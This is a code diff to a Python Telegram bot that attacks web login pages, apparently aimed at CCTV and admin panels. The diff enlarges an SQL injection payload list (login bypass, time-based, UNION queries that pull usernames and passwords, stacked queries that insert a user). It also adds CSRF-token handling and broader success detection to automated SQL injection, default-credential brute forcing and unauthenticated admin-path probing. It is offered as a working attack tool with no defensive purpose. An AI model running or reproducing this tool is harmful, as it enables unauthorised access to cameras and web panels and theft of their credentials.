@@ -4,7 +4,7 @@ import asyncio
 import re
 import logging
 import threading
-from typing import Tuple
+from typing import Tuple, Optional
 from urllib.parse import urljoin
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
@@ -85,29 +85,39 @@ PASSWORDS = [
     "1234", "adminadmin", "root", "toor", "pass", "test", "qwerty", "letmein"
 ]
 
-# SQL injection payloads (high-level, 50+)
+# SQL injection payloads (advanced, 60+)
 SQL_PAYLOADS = [
+    # Basic bypass
     "' OR '1'='1", "admin' --", "admin' #", "' OR ''='", "admin' OR '1'='1",
     "' OR 1=1--", "' OR 'a'='a", "') OR ('1'='1", "' OR 1=1#", "admin' OR 1=1--",
     "1' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "admin' OR 'a'='a",
     "' OR '1'='1'/*", "admin'/*", "admin'*/", "' OR 1=1/*", "admin' OR 1=1/*",
-    "') OR '1'='1", "' OR '1'='1' OR ''='", "admin' OR ''='", "' OR 1=1 LIMIT 1--",
-    "' OR '1'='1' UNION SELECT NULL, NULL--", "' OR '1'='1' UNION SELECT 1, 2--",
+    "') OR '1'='1", "' OR '1'='1' OR ''='", "admin' OR ''='",
+    # Advanced bypass
+    "' OR 1=1 LIMIT 1--", "admin' AND 1=2--", "' OR 1=1 ORDER BY 1--",
+    "') OR ('1'='1')--", "' OR '1'='1' AND 1=1--", "admin' OR 1=1 LIMIT 1 OFFSET 0--",
+    # Blind/time-based
+    "' OR SLEEP(2)--", "' OR IF(1=1,SLEEP(2),0)--", "admin' AND SLEEP(2)--",
+    "' OR (SELECT SLEEP(2))--", "' OR 1=1 AND (SELECT SLEEP(2) FROM dual)--",
+    "' OR BENCHMARK(1000000,MD5(1))--", "admin' OR SLEEP(2) AND '1'='1--",
+    # Union-based (credential extraction)
+    "' UNION SELECT NULL, NULL--", "' UNION SELECT 1, 2--",
     "' UNION SELECT username, password FROM users--",
     "' UNION SELECT 1, concat(username, ':', password) FROM users--",
     "' UNION SELECT 1, version()--", "' UNION SELECT 1, user()--",
-    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
-    "' OR (SELECT COUNT(*) FROM users) > 0--", "' OR 1=1 ORDER BY 1--",
-    "' OR 1=1 UNION SELECT NULL, NULL, NULL--", "' OR 1=1 LIMIT 1 OFFSET 0--",
-    "admin' AND 1=0 UNION SELECT username, password FROM users--",
-    "' OR '1'='1' AND SLEEP(1)--", "' OR IF(1=1,1,0)--", "' OR 1=1 INTO OUTFILE '/tmp/test'--",
-    "' OR 1=1 UNION SELECT 1, database()--", "' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables--",
-    "' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
-    "admin' OR 1=1 UNION SELECT 1, group_concat(username) FROM users--",
-    "' OR 1=1 UNION SELECT 1, @@version--", "' OR 1=1 UNION SELECT 1, current_user()--",
-    "' OR 1=1 AND (SELECT 1 FROM dual)--", "' OR 1=1 AND (SELECT 1 FROM users LIMIT 1)--",
-    "admin' OR 1=1 AND (SELECT password FROM users WHERE username='admin')--",
-    "' OR 1=1 AND (SELECT username FROM users WHERE 1=1)--"
+    "' UNION SELECT 1, database()--", "' UNION SELECT 1, @@version--",
+    "' UNION SELECT 1, table_name FROM information_schema.tables--",
+    "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
+    # Error-based
+    "' OR 1=1 AND (SELECT 1 FROM users WHERE 1=1)--",
+    "admin' AND (SELECT password FROM users WHERE username='admin')--",
+    "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+    "' OR 1=1 AND (SELECT 1/0 FROM dual)--",
+    # Stacked queries
+    "'; SELECT 1--", "'; SELECT SLEEP(2)--", "admin'; SELECT username FROM users--",
+    "'; INSERT INTO users (username, password) VALUES ('test', 'test')--",
+    # CCTV-specific
+    "' OR 'admin'='admin'--", "admin' OR 'root'='root'--", "' OR 'guest'='guest'--"
 ]
 
 async def check_access(user_id: str) -> bool:
@@ -216,58 +226,79 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     await update.message.reply_text("Operation cancelled.")
 
-async def get_form_fields(url: str, session: ClientSession) -> Tuple[str, str]:
+async def get_form_fields(url: str, session: ClientSession) -> Tuple[str, str, Optional[dict]]:
     try:
         async with session.get(url, ssl=False) as response:
             html = await response.text()
             form_match = re.search(r'<form.*?>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
             if form_match:
                 inputs = re.findall(r'<input.*?name=["\'](.*?)["\'].*?>', form_match.group(1), re.IGNORECASE)
-                username_field = next((i for i in inputs if i.lower() in ["username", "user", "login"]), "username")
-                password_field = next((i for i in inputs if i.lower() in ["password", "pass"]), "password")
-                return username_field, password_field
+                username_field = next((i for i in inputs if i.lower() in ["username", "user", "login", "email", "name"]), "username")
+                password_field = next((i for i in inputs if i.lower() in ["password", "pass", "pwd"]), "password")
+                # Check for CSRF token
+                csrf_token = None
+                csrf_match = re.search(r'<input.*?name=["\'](.*?)["\'].*?value=["\'](.*?)["\'].*?>', html, re.IGNORECASE)
+                if csrf_match and "csrf" in csrf_match.group(1).lower():
+                    csrf_token = {csrf_match.group(1): csrf_match.group(2)}
+                return username_field, password_field, csrf_token
     except Exception as e:
         logger.error(f"Error parsing form: {e}")
-    return "username", "password"
+    return "username", "password", None
 
-async def check_success(response, html: str) -> bool:
+async def check_success(response, html: str, session: ClientSession) -> bool:
     try:
         if response.status == 200:
+            # Check for no login form
             if not re.search(r'login|sign in|invalid|error', html, re.IGNORECASE):
                 return True
-            if re.search(r'dashboard|welcome|control panel|admin', html, re.IGNORECASE):
+            # Check for dashboard keywords
+            if re.search(r'dashboard|welcome|control panel|admin|settings', html, re.IGNORECASE):
                 return True
-            if response.url.path in ["/dashboard", "/admin", "/home", "/panel"]:
+            # Check redirect to protected path
+            if response.url.path in ["/dashboard", "/admin", "/home", "/panel", "/settings"]:
                 return True
+            # Check for session cookies
+            if response.cookies.get("session") or response.cookies.get("auth"):
+                return True
+            # Check JSON response (modern panels)
+            if response.content_type == "application/json":
+                json_data = await response.json()
+                if json_data.get("success") or json_data.get("authenticated"):
+                    return True
     except Exception as e:
         logger.error(f"Error checking success: {e}")
     return False
 
 async def sql_injection(url: str, session: ClientSession, update: Update) -> list:
     results = []
-    username_field, password_field = await get_form_fields(url, session)
+    username_field, password_field, csrf_token = await get_form_fields(url, session)
     total_payloads = len(SQL_PAYLOADS)
     for i, payload in enumerate(SQL_PAYLOADS, 1):
         try:
             data = {username_field: payload, password_field: "test"}
-            async with session.post(url, data=data, ssl=False, timeout=3) as response:
+            if csrf_token:
+                data.update(csrf_token)
+            async with session.post(url, data=data, ssl=False, timeout=3, allow_redirects=True) as response:
                 html = await response.text()
-                if await check_success(response, html):
+                if await check_success(response, html, session):
                     results.append(f"✅ Bypassed! Payload: {payload}\n[🌐 Visit {response.url}]")
+                    logger.info(f"SQL bypass success: {payload}")
                     break
-                if re.search(r'username:.*?, password:.*?', html, re.IGNORECASE):
-                    results.append(f"✅ Credentials Found: {html[:100]}")
-                await asyncio.sleep(0.3)  # Stricter rate limiting
+                # Check for credentials in response (union-based)
+                cred_match = re.search(r'username:.*?(\w+).*?password:.*?(\w+)', html, re.IGNORECASE)
+                if cred_match:
+                    results.append(f"✅ Credentials Found: Username: {cred_match.group(1)}, Password: {cred_match.group(2)}")
+                await asyncio.sleep(0.4)  # Stricter rate limiting
             if i % 5 == 0:
                 await update.message.reply_text(f"Progress: {i}/{total_payloads} payloads")
         except Exception as e:
-            logger.error(f"SQL injection error: {e}")
+            logger.error(f"SQL injection error on payload {payload}: {e}")
             continue
-    return results or ["❌ No bypass found."]
+    return results or ["❌ No bypass found. Try a different URL or check form fields."]
 
 async def brute_force(url: str, session: ClientSession, update: Update) -> list:
     results = []
-    username_field, password_field = await get_form_fields(url, session)
+    username_field, password_field, csrf_token = await get_form_fields(url, session)
     total_combinations = len(USERNAMES) * len(PASSWORDS)
     count = 0
     for username in USERNAMES:
@@ -275,12 +306,16 @@ async def brute_force(url: str, session: ClientSession, update: Update) -> list:
             count += 1
             try:
                 data = {username_field: username, password_field: password}
-                async with session.post(url, data=data, ssl=False, timeout=3) as response:
+                if csrf_token:
+                    data.update(csrf_token)
+                async with session.post(url, data=data, ssl=False, timeout=3, allow_redirects=True) as response:
                     html = await response.text()
-                    if await check_success(response, html):
-                        results.append(f"✅ Cracked! Username: {username}, Password: {password}\n[🌐 Visit {response.url}]")
+                    if await check_success(response, html, session):
+                        direct_url = f"{url.replace('/login', '')}/dashboard"
+                        results.append(f"✅ Cracked! Username: {username}, Password: {password}\n[🌐 Visit {direct_url}]")
+                        logger.info(f"Brute force success: {username}:{password}")
                         return results
-                    await asyncio.sleep(0.3)
+                    await asyncio.sleep(0.4)
                 if count % 5 == 0:
                     await update.message.reply_text(f"Progress: {count}/{total_combinations} combinations")
             except Exception as e:
@@ -294,12 +329,13 @@ async def direct_check(base_url: str, session: ClientSession, update: Update) ->
     for i, path in enumerate(DIRECT_PATHS, 1):
         try:
             full_url = urljoin(base_url, path)
-            async with session.get(full_url, ssl=False, timeout=3) as response:
+            async with session.get(full_url, ssl=False, timeout=3, allow_redirects=True) as response:
                 html = await response.text()
                 if response.status == 200 and not re.search(r'<form.*?(login|username|password).*?>', html, re.IGNORECASE):
                     if re.search(r'dashboard|admin|control panel|settings', html, re.IGNORECASE):
                         results.append(f"✅ Accessible without login: {full_url}\n[🌐 Visit {full_url}]")
-                await asyncio.sleep(0.3)
+                        logger.info(f"Direct access success: {full_url}")
+                await asyncio.sleep(0.4)
             if i % 5 == 0:
                 await update.message.reply_text(f"Progress: {i}/{total_paths} paths")
         except Exception as e:
